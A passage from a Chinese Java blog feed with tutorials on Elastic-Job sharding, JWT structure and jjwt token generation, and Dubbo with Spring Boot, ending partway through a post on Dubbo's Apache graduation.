        <content type="html"><![CDATA[<p>Elastic-Job支持 JAVA API 和 Spring 配置两种方式配置任务，这里我们使用 JAVA API 的形式来创建一个简单的任务入门，现在都是 Spring Boot 时代了，所以不建议使用 Spring 配置文件的形式。</p><p>Elastic-Job 需要依赖 Zookeeper 中间件，用于注册和协调作业分布式行为的组件，目前仅支持 Zookeeper。我们已经创建了 Zookeeper 集群！</p><h4 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h4><p>1、Java 请使用 JDK 1.7 及其以上版本。</p><p>2、Zookeeper 请使用 Zookeeper 3.4.6 及其以上版本。</p><p>3、Maven 请使用 Maven 3.0.4 及其以上版本。</p><h4 id="引入maven依赖"><a href="#引入maven依赖" class="headerlink" title="引入maven依赖"></a>引入maven依赖</h4><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;com.dangdang&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;elastic-job-lite-core&lt;&#x2F;artifactId&gt;    &lt;version&gt;2.1.5&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有一个坑，这个依赖里面会包含有两个不同版本的 curator-client，导致调用里面方法的时候会找不到方法，所以需要单独引入 curator-client 的依赖包。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.apache.curator&lt;&#x2F;groupId&gt;&lt;artifactId&gt;curator-client&lt;&#x2F;artifactId&gt;&lt;version&gt;2.11.1&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="创建作业"><a href="#创建作业" class="headerlink" title="创建作业"></a>创建作业</h4><p>Elastic-Job 提供 Simple、Dataflow 和 Script 3种作业类型。</p><p>方法参数 shardingContext 包含作业配置、片和运行时信息。可通过 getShardingTotalCount(), getShardingItem() 等方法分别获取分片总数，运行在本作业服务器的分片序列号等。</p><p>这里我们创建一个简单（Simple）作业。</p><pre class="line-numbers language-none"><code class="language-none">public class MyElasticJob implements SimpleJob &#123;@Overridepublic void execute(ShardingContext context) &#123;switch (context.getShardingItem()) &#123;case 0: &#123;System.out.println(&quot;MyElasticJob - 0&quot;);break;&#125;case 1: &#123;System.out.println(&quot;MyElasticJob - 1&quot;);break;&#125;case 2: &#123;System.out.println(&quot;MyElasticJob - 2&quot;);break;&#125;default: &#123;System.out.println(&quot;MyElasticJob - default&quot;);&#125;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>上面的0-2涉及分布式作业框架中分片的概念</strong></p><p>任务的分布式执行，需要将一个任务拆分为多个独立的任务项，然后由分布式的服务器分别执行某一个或几个分片项。</p><p>例如：有一个遍历数据库某张表的作业，现有2台服务器。为了快速的执行作业，那么每台服务器应执行作业的50%。为满足此需求，可将作业分成2片，每台服务器执行1片。作业遍历数据的逻辑应为：服务器A遍历ID以奇数结尾的数据；服务器B遍历ID以偶数结尾的数据。如果分成10片，则作业遍历数据的逻辑应为：每片分到的分片项应为ID%10，而服务器A被分配到分片项0,1,2,3,4；服务器B被分配到分片项5,6,7,8,9，直接的结果就是服务器A遍历ID以0-4结尾的数据；服务器B遍历ID以5-9结尾的数据。</p><blockquote><p>作业分片策略：<a href="http://elasticjob.io/docs/elastic-job-lite/02-guide/job-sharding-strategy/">http://elasticjob.io/docs/elastic-job-lite/02-guide/job-sharding-strategy/</a></p></blockquote><h4 id="配置作业"><a href="#配置作业" class="headerlink" title="配置作业"></a>配置作业</h4><p><strong>Elastic-Job 配置分为3个层级，分别是 Core, Type 和 Root，每个层级使用相似于装饰者模式的方式装配。</strong></p><p>Core 对应 JobCoreConfiguration，用于提供作业核心配置信息，如：作业名称、分片总数、CRON表达式等。</p><p>Type 对应 JobTypeConfiguration，有3个子类分别对应 SIMPLE, DATAFLOW 和 SCRIPT 类型作业，提供3种作业需要的不同配置，如：DATAFLOW 类型是否流式处理或 SCRIPT 类型的命令行等。</p><p>Root 对应 JobRootConfiguration，有2个子类分别对应 Lite 和 Cloud 部署类型，提供不同部署类型所需的配置，如：Lite类型的是否需要覆盖本地配置或 Cloud 占用 CPU 或 Memory 数量等。</p><p>在 Spring Boot 启动类里面加作业配置代码。</p><pre class="line-numbers language-none"><code class="language-none">private static CoordinatorRegistryCenter createRegistryCenter() &#123;    CoordinatorRegistryCenter regCenter &#x3D; new ZookeeperRegistryCenter(new ZookeeperConfiguration(&quot;192.168.10.31:2181,192.168.10.32:2181,192.168.10.33:2181&quot;, &quot;elastic-job-demo&quot;));    regCenter.init();    return regCenter;&#125;private static LiteJobConfiguration createJobConfiguration() &#123;    &#x2F;&#x2F; 定义作业核心配置    JobCoreConfiguration simpleCoreConfig &#x3D; JobCoreConfiguration.newBuilder(&quot;demoSimpleJob&quot;, &quot;0&#x2F;15 * * * * ?&quot;, 10).build();        &#x2F;&#x2F; 定义SIMPLE类型配置    SimpleJobConfiguration simpleJobConfig &#x3D; new SimpleJobConfiguration(simpleCoreConfig, MyElasticJob.class.getCanonicalName());        &#x2F;&#x2F; 定义Lite作业根配置    LiteJobConfiguration simpleJobRootConfig &#x3D; LiteJobConfiguration.newBuilder(simpleJobConfig).build();&#125;@Beanpublic CommandLineRunner commandLineRunner() &#123;return (String... args) -&gt; &#123;new JobScheduler(createRegistryCenter(), createJobConfiguration()).init();&#125;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SimpleJobConfiguration 实现了JobTypeConfiguration接口。</p><p>LiteJobConfiguration 实现了JobRootConfiguration接口。</p><p>使用CommandLineRunner，可以等 Spring Boot 启动后再启动 Elastic-Job 作业。</p><p>其他的最基础的 Spring Boot 的配置就不说了，不懂的可以去公众号菜单 Spring Boot 专题中学习。</p><blockquote><p>更多作业的配置请参考官方文档：<a href="http://elasticjob.io/docs/elastic-job-lite/02-guide/config-manual/">http://elasticjob.io/docs/elastic-job-lite/02-guide/config-manual/</a></p></blockquote><h4 id="启动作业"><a href="#启动作业" class="headerlink" title="启动作业"></a>启动作业</h4><p>在工具里面使用 maven 命令 spring-boot:run 启动即可。</p><p>程序输出：</p><pre class="line-numbers language-none"><code class="language-none">MyElasticJob - 0MyElasticJob - 1MyElasticJob - 2MyElasticJob - defaultMyElasticJob - defaultMyElasticJob - defaultMyElasticJob - defaultMyElasticJob - defaultMyElasticJob - defaultMyElasticJob - default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于是单个实例，所有 10 个分片都在一个实例输出来了，现在我们把它打成 jar 包，然后再用另外一个端口启动看下是否分片成功。</p><p>两边分别输出：</p><pre class="line-numbers language-none"><code class="language-none">MyElasticJob - 0MyElasticJob - 1MyElasticJob - 2MyElasticJob - defaultMyElasticJob - default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和</p><pre class="line-numbers language-none"><code class="language-none">MyElasticJob - defaultMyElasticJob - defaultMyElasticJob - defaultMyElasticJob - defaultMyElasticJob - default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的输出信息说明分片成功了，然后停掉一个项目后发现又自动触发分片，所有的都在同一个输出来了。</p><p>可以看出分片功能真的非常实用，作业开发起来真的很方便，整个架构也很清晰，推荐大家使用。</p><p>后面还更多的 Elastic-Job 实战干货请继续关注，觉得有用就动手分享鼓励一下我们吧！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Elastic Job </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT - 服务端信息传输安全解决方案</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/JWT/JWT%20-%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BF%A1%E6%81%AF%E4%BC%A0%E8%BE%93%E5%AE%89%E5%85%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/JWT/JWT%20-%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BF%A1%E6%81%AF%E4%BC%A0%E8%BE%93%E5%AE%89%E5%85%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p><img src="http://s1.51cto.com/wyfs02/M01/9E/8C/wKioL1mTIqHT6t3uAACjzS9yw9I624.jpg-wh_651x-s_1547569217.jpg" alt="image"></p><h4 id="JWT介绍"><a href="#JWT介绍" class="headerlink" title="JWT介绍"></a>JWT介绍</h4><p>JSON Web Token(JWT)是一种开放标准(RFC 7519)，它定义了一种紧凑独立的基于JSON对象在各方之间安全地传输信息的方式。这些信息可以被验证和信任，因为它是数字签名的。JWTs可以使用一个密钥(HMAC算法)，或使用RSA的公钥&#x2F;私钥密钥对对信息进行签名。</p><p>让我们进一步解释这个定义的一些概念。</p><ul><li><strong>紧凑</strong></li></ul><p>由于其较小的体积，JWTs可以通过URL、POST参数或HTTP头部参数进行传递，体积小也意味着其传输速度会相当快。</p><ul><li><strong>独立</strong></li></ul><p>有效负载包含了所需要的关于用户的所有信息，避免了多次查询数据库的需要。</p><h4 id="JWT的应用场景"><a href="#JWT的应用场景" class="headerlink" title="JWT的应用场景"></a>JWT的应用场景</h4><ul><li><strong>认证</strong></li></ul><p>这是使用JWT最常见的场景，一旦用户登录后，每个后续的请求都会包含JWT token，允许用户访问该token所允许的路由、服务、资源等。如单点登录是目前广泛使用JWT的一项功能，因为它的开销很小，而且在不同的域名中很容易使用。</p><ul><li><strong>信息交换</strong></li></ul><p>JWT是一种在多方之间传递数据比较好的方式，因为JWT能使用签名，能确保发送者是谁，也可以验证传递过来的的信息是否被篡改。</p><h4 id="JWT的结构"><a href="#JWT的结构" class="headerlink" title="JWT的结构"></a>JWT的结构</h4><p>JWT由以下三部分组成：</p><ol><li><strong>Header（头部）</strong></li><li><strong>Payload（载荷）</strong></li><li><strong>Signature（签名）</strong></li></ol><p>因此，JWT通常看起来如下。</p><pre class="line-numbers language-none"><code class="language-none">xxxxx.yyyyy.zzzzz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>Header</strong></p><p>header通常由两个部分组成：token类型（即JWT)和正在使用的散列算法，如HMAC SHA256或RSA。</p><p>如：</p><pre class="line-numbers language-none"><code class="language-none">&#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这个JSON经过Base64编码后形成JWT的第一部分。</p><p><strong>Payload</strong></p><p>载荷包含了对实体的申明，用户和一些其他元信息。申明以下三种。</p><ol><li>注册的申明</li><li>公开的申明</li><li>私有的申明</li></ol><p>如：</p><pre class="line-numbers language-none"><code class="language-none">&#123;  &quot;sub&quot;: &quot;1234567890&quot;,  &quot;name&quot;: &quot;John Doe&quot;,  &quot;admin&quot;: true&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个JSON经过Base64编码后形成JWT的第二部分。</p><p><strong>Signature</strong></p><p>签名用于验证JWT的发送者是谁，并确保消息在过程中不会被篡改。</p><p>创建签名部分，你需要用到编码后的header、编码后的payload、密钥、在header中指定的算法。</p><p>如下使用HMAC SHA256算法创建签名的方式：</p><pre class="line-numbers language-none"><code class="language-none">HMACSHA256(  base64UrlEncode(header) + &quot;.&quot; +  base64UrlEncode(payload),  secret)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>讲完了上面3个部门，最后就是由这3部分组成了。每个部分经过base64编码后，以.分隔。它能很容易的在HTML和HTTP环境中传递，也比像类似xml标准格式这样的更紧凑。</p><p><img src="https://cdn.auth0.com/content/jwt/encoded-jwt3.png" alt="image"></p><p>如果想使用JWT并将这些概念应用到实践中，您可以使用官网首页下面的调试器来解码、验证和生成JWTs。</p><p><img src="https://cdn.auth0.com/blog/legacy-app-auth/legacy-app-auth-5.png" alt="image"></p><h4 id="JWT的工作原理"><a href="#JWT的工作原理" class="headerlink" title="JWT的工作原理"></a>JWT的工作原理</h4><p>在身份验证中，当用户成功地使用他们的凭证登录时，将返回一个JWT的token，并且必须在本地保存(通常在本地保存，但也可以使用cookie)，而不是在服务器中创建会话并返回cookie的传统方法。</p><p>当用户想要访问受保护的路由或资源时，用户代理应该发送token，通常是在使用Bearer模式的Authorization头参数中。标题的内容应该如下所示:</p><pre class="line-numbers language-none"><code class="language-none">Authorization: Bearer &lt;token&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是一个无状态的身份验证机制，因为用户状态永远不会保存在服务器内存中。服务器的受保护路由将在授权头中检查有效的JWT，如果它存在，用户将被允许访问受保护的资源。由于JWTs是独立的，所以所有必要的信息都在那里，减少了多次查询数据库的需求。</p><p>这使得完全可以依赖无状态的数据api，甚至向下游服务发出请求。哪个域名api服务并不重要，因为CORS攻击不会成为一个问题，因为它不使用cookie。</p><p>工作流程如下：</p><p><img src="https://cdn.auth0.com/content/jwt/jwt-diagram.png" alt="image"></p><h4 id="JWT的优点"><a href="#JWT的优点" class="headerlink" title="JWT的优点"></a>JWT的优点</h4><ul><li>因为JSON数据格式的通用性，所以JWT是可以跨语言的，主流语言都可以支持。</li><li>payload部分可以存储其他业务逻辑所必要的非敏感信息。</li><li>JWT构成简单，字节占用很小，所以非常便于传输的。</li><li>不需要在服务端保存会话信息，易于应用的扩展和安全等。</li></ul><h4 id="JWT的使用注意"><a href="#JWT的使用注意" class="headerlink" title="JWT的使用注意"></a>JWT的使用注意</h4><ol><li>不要在payload存放敏感信息，因为该部分是可解密的。</li><li>保存好secret私钥十分重要。</li><li>尽量使用https协议</li></ol><h4 id="JWT参考网站"><a href="#JWT参考网站" class="headerlink" title="JWT参考网站"></a>JWT参考网站</h4><blockquote><p>官网：<a href="https://jwt.io/">https://jwt.io/</a></p></blockquote><blockquote><p>官方介绍：<a href="https://jwt.io/introduction/">https://jwt.io/introduction/</a></p></blockquote><blockquote><p>支持类库：<a href="https://jwt.io/#libraries-io">https://jwt.io/#libraries-io</a></p></blockquote><blockquote><p>RFC 7519规范：<a href="https://tools.ietf.org/html/rfc7519">https://tools.ietf.org/html/rfc7519</a></p></blockquote><p>明天带来JWT的Java实战。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT 生成Token及解密实战</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/JWT/JWT%20%E7%94%9F%E6%88%90Token%E5%8F%8A%E8%A7%A3%E5%AF%86%E5%AE%9E%E6%88%98/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/JWT/JWT%20%E7%94%9F%E6%88%90Token%E5%8F%8A%E8%A7%A3%E5%AF%86%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p>昨天讲解了JWT的介绍、应用场景、优点及注意事项等，今天来个JWT具体的使用实践吧。</p><p>从JWT官网支持的类库来看，jjwt是Java支持的算法中最全的，推荐使用，网址如下。</p><blockquote><p><a href="https://github.com/jwtk/jjwt">https://github.com/jwtk/jjwt</a></p></blockquote><p>下面来看看如何使用jjwt来实现JWT token的生成与解密，主要用到sha512算法来演示。</p><p><strong>1、导入jjwt的maven包。</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;io.jsonwebtoken&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;jjwt&lt;&#x2F;artifactId&gt;    &lt;version&gt;0.9.0&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：JJWT依赖Jackson 2.x，低版本将报错。</p><p><strong>2、建立一个JWTTest测试类。</strong></p><p><strong>3、创建密钥；</strong></p><p>这里使用sha512算法，所以需要一个密钥。</p><pre class="line-numbers language-none"><code class="language-none">Key KEY &#x3D; new SecretKeySpec(&quot;javastack&quot;.getBytes(),SignatureAlgorithm.HS512.getJcaName());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样就生成了一个固定的密钥：javastack</p><p><strong>4、生成JWT token。</strong></p><p>核心代码如下：</p><pre class="line-numbers language-none"><code class="language-none">Map&lt;String, Object&gt; stringObjectMap &#x3D; new HashMap&lt;&gt;();stringObjectMap.put(&quot;type&quot;, &quot;1&quot;);String payload &#x3D; &quot;&#123;\&quot;user_id\&quot;:\&quot;1341137\&quot;, \&quot;expire_time\&quot;:\&quot;2018-01-01 0:00:00\&quot;&#125;&quot;;String compactJws &#x3D; Jwts.builder().setHeader(stringObjectMap).setPayload(payload).signWith(SignatureAlgorithm.HS512, KEY).compact();System.out.println(&quot;jwt key:&quot; + new String(KEY.getEncoded()));System.out.println(&quot;jwt payload:&quot; + payload);System.out.println(&quot;jwt encoded:&quot; + compactJws);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：header可以不用设置，claims不能和payload同时设置。</p><p>输出结果：</p><pre class="line-numbers language-none"><code class="language-none">jwt key:javastackjwt payload:&#123;&quot;user_id&quot;:&quot;1341137&quot;, &quot;expire_time&quot;:&quot;2018-01-01 0:00:00&quot;&#125;jwt encoded:eyJ0eXBlIjoiMSIsImFsZyI6IkhTNTEyIn0.eyJ1c2VyX2lkIjoiMTM0MTEzNyIsICJleHBpcmVfdGltZSI6IjIwMTgtMDEtMDEgMDowMDowMCJ9.cnyXRnwczgNcNYqV6TUY2MaMfk6vujsZltC8Q51l40dwYJg516oZcV4VDKOypPT8fD7AE63PIhfdm2ALVrfv5A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>5、解密JWT token内容。</strong></p><p>核心代码如下：</p><pre class="line-numbers language-none"><code class="language-none">Jws&lt;Claims&gt; claimsJws &#x3D; Jwts.parser().setSigningKey(KEY).parseClaimsJws(compactJws);JwsHeader header &#x3D; claimsJws.getHeader();Claims body &#x3D; claimsJws.getBody();System.out.println(&quot;jwt header:&quot; + header);System.out.println(&quot;jwt body:&quot; + body);System.out.println(&quot;jwt body user-id:&quot; + body.get(&quot;user_id&quot;, String.class));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果：</p><pre class="line-numbers language-none"><code class="language-none">jwt header:&#123;type&#x3D;1, alg&#x3D;HS512&#125;jwt body:&#123;user_id&#x3D;1341137, expire_time&#x3D;2018-01-01 0:00:00&#125;jwt body user-id:1341137<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再用密文去JWT官网的调试器解密一下，看是否成功。</p><p><img src="http://img.javastack.cn/18-1-4/36539517.jpg"></p><p>解密成功，其他算法使用逻辑一样，这样我们可以使用JWT来实现不同服务之间数据的安全传递。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dubbo &amp; Spring Boot 要来了</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Dubbo/Dubbo%20&amp;%20Spring%20Boot%20%E8%A6%81%E6%9D%A5%E4%BA%86/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Dubbo/Dubbo%20&amp;%20Spring%20Boot%20%E8%A6%81%E6%9D%A5%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=3636281043,3305223769&fm=27&gp=0.jpg" alt="image"></p><p>Duboo和Spring Boot都是非常优秀的框架，现在它们要结合了。为了简化Dubbo开发集成，阿里Dubbo团队将发布基于Spring Boot的版本，可快速上手Dubbo的分布式开发，并提供了一些准生产环境特性（如安全、健康检查、配置外部化等……）。</p><p>如果你还不知道什么是Dubbo，可以去Dubbo官网（<a href="http://dubbo.io)花点时间了解下./">http://dubbo.io）花点时间了解下。</a></p><p><strong>下面来看看Dubbo &amp; Spring Boot集成是如何做的！</strong></p><p>用过Dubbo的都知道，分布式场景中有两个重要的角色，一个是提供者，一个是消费者。</p><h4 id="如何实现提供者服务"><a href="#如何实现提供者服务" class="headerlink" title="如何实现提供者服务"></a>如何实现提供者服务</h4><p><strong>1、定义一个提供者接口：DemoService</strong></p><pre class="line-numbers language-none"><code class="language-none">public interface DemoService &#123;    String sayHello(String name);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2、实现一个提供者，并实现DemoService接口</strong></p><pre class="line-numbers language-none"><code class="language-none">@Service(        version &#x3D; &quot;1.0.0&quot;,        application &#x3D; &quot;$&#123;dubbo.application.id&#125;&quot;,        protocol &#x3D; &quot;$&#123;dubbo.protocol.id&#125;&quot;,        registry &#x3D; &quot;$&#123;dubbo.registry.id&#125;&quot;)public class DefaultDemoService implements DemoService &#123;    public String sayHello(String name) &#123;        return &quot;Hello, &quot; + name + &quot; (from Spring Boot)&quot;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意，提供者服务由注解@Service定义，其参数配置在application文件中，见下方定义。</p><p><strong>3、然后在appliation文件中添加配置</strong></p><pre class="line-numbers language-none"><code class="language-none"># Spring boot applicationspring.application.name &#x3D; dubbo-provider-demoserver.port &#x3D; 9090management.port &#x3D; 9091# Base packages to scan Dubbo Components (e.g @Service , @Reference)dubbo.scan.basePackages  &#x3D; com.alibaba.boot.dubbo.demo.provider.service# Dubbo Config properties## ApplicationConfig Beandubbo.application.id &#x3D; dubbo-provider-demodubbo.application.name &#x3D; dubbo-provider-demo## ProtocolConfig Beandubbo.protocol.id &#x3D; dubbodubbo.protocol.name &#x3D; dubbodubbo.protocol.port &#x3D; 12345## RegistryConfig Beandubbo.registry.id &#x3D; my-registrydubbo.registry.address &#x3D; N&#x2F;A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4、最后再提供一个提供者服务启动类</strong></p><pre class="line-numbers language-none"><code class="language-none">@SpringBootApplicationpublic class DubboProviderDemo &#123;    public static void main(String[] args) &#123;        SpringApplication.run(DubboProviderDemo.class,args);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>更多提供者示例代码可参考：<a href="https://github.com/dubbo/dubbo-spring-boot-project/tree/master/dubbo-spring-boot-samples/dubbo-spring-boot-sample-provider">https://github.com/dubbo/dubbo-spring-boot-project/tree/master/dubbo-spring-boot-samples/dubbo-spring-boot-sample-provider</a></p></blockquote><h4 id="如何实现消费者服务"><a href="#如何实现消费者服务" class="headerlink" title="如何实现消费者服务"></a>如何实现消费者服务</h4><p>消费者服务用来消费提供者提供的服务，也就是消费者服务调用提供者的服务进行操作。</p><p>消费者需要注入提供者的接口对应的Spring Bean实例。</p><p><strong>1、定义一个消费者</strong></p><pre class="line-numbers language-none"><code class="language-none">@RestControllerpublic class DemoConsumerController &#123;    @Reference(version &#x3D; &quot;1.0.0&quot;,            application &#x3D; &quot;$&#123;dubbo.application.id&#125;&quot;,            url &#x3D; &quot;dubbo:&#x2F;&#x2F;localhost:12345&quot;)    private DemoService demoService;    @RequestMapping(&quot;&#x2F;sayHello&quot;)    public String sayHello(@RequestParam String name) &#123;        return demoService.sayHello(name);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>@Reference注解用来注入提供者服务的Spring Bean实例，其参数配置依然在application文件中，见下方定义。</p><p><strong>2、然后在appliation文件中添加配置</strong></p><pre class="line-numbers language-none"><code class="language-none"># Spring boot applicationspring.application.name &#x3D; dubbo-consumer-demoserver.port &#x3D; 8080management.port &#x3D; 8081# Dubbo Config properties## ApplicationConfig Beandubbo.application.id &#x3D; dubbo-consumer-demodubbo.application.name &#x3D; dubbo-consumer-demo## ProtocolConfig Beandubbo.protocol.id &#x3D; dubbodubbo.protocol.name &#x3D; dubbodubbo.protocol.port &#x3D; 12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3、最后再提供一个消费者服务启动类</strong></p><pre class="line-numbers language-none"><code class="language-none">@SpringBootApplication(scanBasePackages &#x3D; &quot;com.alibaba.boot.dubbo.demo.consumer.controller&quot;)public class DubboConsumerDemo &#123;    public static void main(String[] args) &#123;        SpringApplication.run(DubboConsumerDemo.class,args);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>更多消费者示例代码可参考：<a href="https://github.com/dubbo/dubbo-spring-boot-project/blob/master/dubbo-spring-boot-samples/dubbo-spring-boot-sample-consumer">https://github.com/dubbo/dubbo-spring-boot-project/blob/master/dubbo-spring-boot-samples/dubbo-spring-boot-sample-consumer</a></p></blockquote><p>先启动提供者启动类，再启动消费者启动类，通过访问消费者控制层可调用提供者服务进行消费。</p><p>更多与Spring Boot集成的新特性可参考官方文档</p><blockquote><p>项目地址：<a href="https://github.com/dubbo/dubbo-spring-boot-project">https://github.com/dubbo/dubbo-spring-boot-project</a></p></blockquote><p>看完是不是觉得上手非常简单了，Spring Boot真是快速开发神器。不过，目前该项目还未正式发布，敬请期待，我们也将会持续关注，如果有更进一步消息会及时通知到大家。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dubbo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>厉害了，Dubbo 正式毕业！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Dubbo/%E5%8E%89%E5%AE%B3%E4%BA%86%EF%BC%8CDubbo%20%E6%AD%A3%E5%BC%8F%E6%AF%95%E4%B8%9A%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Dubbo/%E5%8E%89%E5%AE%B3%E4%BA%86%EF%BC%8CDubbo%20%E6%AD%A3%E5%BC%8F%E6%AF%95%E4%B8%9A%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>厉害了，2019&#x2F;05&#x2F;21 Apache软件基金会发表博文，宣布 Dubbo 在 2019&#x2F;05&#x2F;20 这天正式毕业，成为 Apache 的顶级项目。</p><blockquote><p>参考：<a href="https://blogs.apache.org/foundation/entry/the-apache-software-foundation-announces52">https://blogs.apache.org/foundation/entry/the-apache-software-foundation-announces52</a></p></blockquote><p>不过 Github 的名称还没改过来，还是叫 incubator-dubbo，坐等更新为：dubbo，估计快了。</p><p><strong>栈长这里科普一下：</strong></p><p>Dubbo是阿里巴巴开源的 RPC 框架，后进入 Apache 开源孵化器，目前已在数十家公司中使用，包括阿里巴巴集团、中国人寿、中国电信、当当网、滴滴出行、海尔、中国工商银行等，大多是国内公司。</p><p>哈哈，上一张 Dubbo 的架构图，来自官网：</p><p><img src="http://img.javastack.cn/20190521155904.png"></p><p><strong>再来回顾下 Dubbo 的发展史：</strong></p><p><strong>2011&#x2F;10&#x2F;27：</strong> 阿里巴巴巴宣布 Dubbo 开源。</p><p><strong>2012&#x2F;10&#x2F;23：</strong> 发布最后一个版本 2.5.3 并停止维护更新。</p><p><strong>2017&#x2F;07&#x2F;31：</strong> 起死回生，官方宣布开启重新更新，并会得到重点维护，参考：<a href="https://mp.weixin.qq.com/s/QNGir1_1TOCNv7AfFAHVLg">起死回生的分布式神器—Dubbo</a>。</p><p><strong>2017&#x2F;09&#x2F;07：</strong> 发布起死回生的第一个版本：<a href="https://mp.weixin.qq.com/s/DEG-i3Y5u4dajS05gmJboA">dubbo-2.5.4</a>。</p><p><strong>2018&#x2F;01&#x2F;08：</strong></p><p>1、Dubbo 团队透露 Dubbo 3.0 宣布正式开工，参考：<a href="https://mp.weixin.qq.com/s/_ir3bm1G5q7SNfdIwKSP2A">重大利好，Dubbo 3.0要来了</a>。</p><p>2、发布了 dubbo-2.6.0 版本，主要合并了由当当网开源的 dubbox 项目分支。PS：dubbo停止维护期间，当当网基于 dubbo 